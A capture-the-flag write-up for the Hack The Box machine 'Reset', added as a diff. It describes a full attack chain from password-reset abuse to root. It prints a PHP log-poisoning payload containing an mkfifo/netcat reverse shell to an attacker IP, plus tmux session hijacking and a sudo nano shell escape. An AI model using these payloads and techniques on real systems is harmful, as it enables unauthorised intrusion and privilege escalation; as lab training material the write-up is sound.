@@ -1,0 +1,97 @@
+HTB: Reset
+
+    Date Completed: August 12, 2025
+
+    Difficulty: Easy (Linux)
+
+    Methodology: Password reset abuse → LFI + log poisoning → RCE (www-data) → su to sadm → tmux leak → sudo/nano → root
+
+#RECON
+
+Starting with a quick Nmap scan:
+
+kali@kali:~/HTB/Machines/r3s37/TCP-Scan$ sudo nmap -sV -sC -A -p 22,80,512,513,514 10.129.222.46
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+80/tcp open http Apache httpd 2.4.52 ((Ubuntu))
+512/tcp open exec netkit-rsh rexecd
+513/tcp open login?
+514/tcp open shell Netkit rshd
+Service Info: OS: Linux
+
+#FOOTHOLD
+
+Admin portal on port 80 has Forgot Password. Captured the request and response:
+
+POST /reset_password.php
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+
+username=admin
+
+Response contains a new admin password in plaintext. Log in as admin.
+
+#LFI / LOG POISONING → RCE
+
+Admin dashboard posts to dashboard.php with file parameter. Tested LFI:
+
+file=/etc/passwd
+
+Read Apache access log (Ubuntu):
+
+file=%2Fvar%2Flog%2Fapache2%2Faccess.log
+
+Poison the log via User-Agent with a reverse shell and include it:
+
+kali@kali:$ nc -lvnp 4444
+kali@kali:$ curl -A "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.198 4444 >/tmp/f'); ?>" http://10.129.222.46/
+
+Then view logs again with:
+
+file=%2Fvar%2Flog%2Fapache2%2Faccess.log
+
+Shell received as www-data.
+
+#SHELL UPGRADE
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo; fg
+stty rows 40 cols 120; export TERM=xterm-256color
+
+#LATERAL MOVEMENT
+
+Check trust and sessions:
+
+www-data@reset:/var/www/html$ cat /etc/hosts.equiv
+www-data@reset:/var/www/html$ ps aux | grep -i tmux
+
+Found detached tmux session by sadm (e.g., sadm_session). Attach:
+
+www-data@reset:/var/www/html$ tmux attach -t sadm_session
+
+From session/output, obtain sadm password (or otherwise recovered creds). Switch user:
+
+www-data@reset:/var/www/html$ su - sadm
+sadm@reset:~$ id
+
+#PRIVILEGE ESCALATION
+
+Enumerate sudo:
+
+sadm@reset:~$ sudo -l
+
+Allowed to run nano /etc/firewall.sh with sudo. Exploit nano:
+
+sadm@reset:~$ sudo nano /etc/firewall.sh
+In nano: Ctrl+R, then Ctrl+X
+
+reset; bash 1>&0 2>&0
+
+root@reset:~# whoami
+root
+
+#FLAGS
+
+sadm@reset:~$ cat /user.txt
+root@reset:# cat /root/root.txt
